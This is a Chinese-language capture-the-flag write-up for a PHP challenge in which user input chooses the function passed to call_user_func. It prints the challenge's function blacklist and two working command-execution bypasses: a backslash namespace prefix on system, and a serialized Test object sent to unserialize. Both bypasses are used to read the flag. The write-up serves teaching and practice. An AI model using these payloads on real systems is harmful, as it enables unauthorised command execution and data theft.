解题步骤

目录扫描，查看robots.txt等一系列操作之后未果，F12看到页面一直在刷新，无法仔细查看于是使用burp抓包，

看到传递了两个参数，试试是不是sql注入，func=date'&p=Y-m-d+h%3Ai%3As+a,post之后，回显以下内容，

call_user_func(callable $callback [, mixed $parameter [, mixed $... ]] ):

callback：将被调用的回调函数(可以传递任何内置函数或用户自定义函数，除了语言结构如array(),echo(),eval()等)，parameter：0个或以上参数，被传入回调函数

<?php
    function ff($p)
{
    echo $p;
}
call_user_func('ff','123');//输出123
?>

于是尝试使用system()函数来进行命令执行，func=system&p=ls

system应该是被过滤了，那先来看看能不能读取index.php源码吧，func=readfile&p=index.php

//读取到的index.php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>

可以看到这里disable_fun禁了很多函数，其中就包括了system，于是这里就有了两者解法

1.命名空间绕过

在PHP中，什么是命名空间？举个例子，在/var/dir1和/var/dir2两个目录中都存在一个1.txt文件，但是在任一一个目录下不能存在两个1.txt，这里就相当于两个命名空间。

在PHP中，命名空间的作用：

a.用户编写的代码与PHP内部的类/函数/常量之间的名字冲突

b.为很长的标识符名称创建一个别名，提高代码可读性

全局空间：如果没有定义任何命名空间，所有类与函数都定义在全局空间，在名称前加\表示该名称是全局空间中的名称，即使该名称位于其他的命名空间中也是如此，而这里的全局空间一般都是PHP系统自带的函数和类等。

所以可以这样绕过func=\system&p=ls

func=\system&p=cat $(find / -name flag*),拿到flag。

find path -option [ expession -print] [-exec -ok command] {} \;
//find命令用来查找指定目录下文件，任何位于option之前的字符串都将被视为欲查找的目录名，如果使用该命令时，不设置任何参数，则find将在当前目录下查找子目录和文件，并将查找到的子目录和文件全部显示出来。
-ipath p,-path p:路径名称符合p的文件，ipath忽略大小写
-name name，-iname name：文件名称符合name的文件，-name忽略大小写
-pid n：pid==n的文件
1.find / -name "flag*"  //查找`/`目录下名称以flag开头的文件
2.find / -name “flag*” -exec ls -l {} \;  //查找`/`目录下名称以flag开头的文件，并列出它们的完整路径
3.cat $(find / -name "flag*")   //结果会打印出符合要求文件的内容

2.结合Test类和反序列化函数进行绕过

因为Test类没有对p和func进行任何过滤，而且存在_destruct函数(析构函数中包含了gettime())，然后disable_func中没有禁用unserialize函数，于是可以构造一波payload：

<?php
    class Test{
    var $p='cat $(find / -name "flag*")';
    var $func="system";
}
$a=new Test();
echo serialize($a);//O:4:"Test":2:{s:1:"p";s:27:"cat $(find / -name "flag*")";s:4:"func";s:6:"system";}
?>
 // func=unserialize&p=O:4:"Test":2:{s:1:"p";s:27:"cat $(find / -name "flag*")";s:4:"func";s:6:"system";}
